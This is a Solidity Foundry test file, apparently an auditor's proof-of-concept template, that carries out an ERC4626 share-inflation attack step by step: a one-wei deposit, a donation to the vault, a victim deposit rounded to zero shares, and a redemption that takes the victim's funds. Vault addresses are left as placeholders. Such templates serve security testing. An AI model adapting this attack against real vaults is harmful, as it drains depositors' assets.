// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./BaseTest.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function asset() external view returns (address);
}

/// @notice Share inflation / first depositor attack PoC template.
/// Tests if an attacker can inflate share price to steal from subsequent depositors.
/// TODO: Replace vault address and underlying asset.
contract ShareInflationTest is BaseTest {
    // TODO: Set protocol-specific addresses
    address constant VAULT = address(0);  // TODO: ERC4626 vault
    address constant ASSET = address(0);  // TODO: underlying asset

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    uint256 constant VICTIM_DEPOSIT = 10_000e18;
    uint256 constant ATTACKER_SEED = 1; // minimal deposit

    function _labelContracts() internal override {
        vm.label(VAULT, "Vault");
        vm.label(ASSET, "Asset");
    }

    function test_shareInflation() public {
        _dealToken(ASSET, attacker, VICTIM_DEPOSIT * 10);
        _dealToken(ASSET, victim, VICTIM_DEPOSIT);

        // Step 1: Attacker makes a tiny deposit to get 1 share
        vm.startPrank(attacker);
        IERC20(ASSET).approve(VAULT, type(uint256).max);
        IERC4626(VAULT).deposit(ATTACKER_SEED, attacker);

        // Step 2: Attacker donates a large amount directly to inflate share price
        IERC20(ASSET).transfer(VAULT, VICTIM_DEPOSIT);
        vm.stopPrank();

        // Step 3: Victim deposits — should get 0 shares due to rounding
        vm.startPrank(victim);
        IERC20(ASSET).approve(VAULT, type(uint256).max);
        uint256 victimShares = IERC4626(VAULT).deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        // Step 4: Attacker redeems their 1 share — gets victim's deposit too
        vm.startPrank(attacker);
        uint256 attackerShares = IERC4626(VAULT).balanceOf(attacker);
        uint256 redeemed = IERC4626(VAULT).redeem(attackerShares, attacker, attacker);
        vm.stopPrank();

        if (victimShares == 0) {
            emit log_string("CRITICAL: Victim received 0 shares — full loss");
        }
        assertGt(redeemed, VICTIM_DEPOSIT, "Attacker should profit from stolen deposit");
    }
}
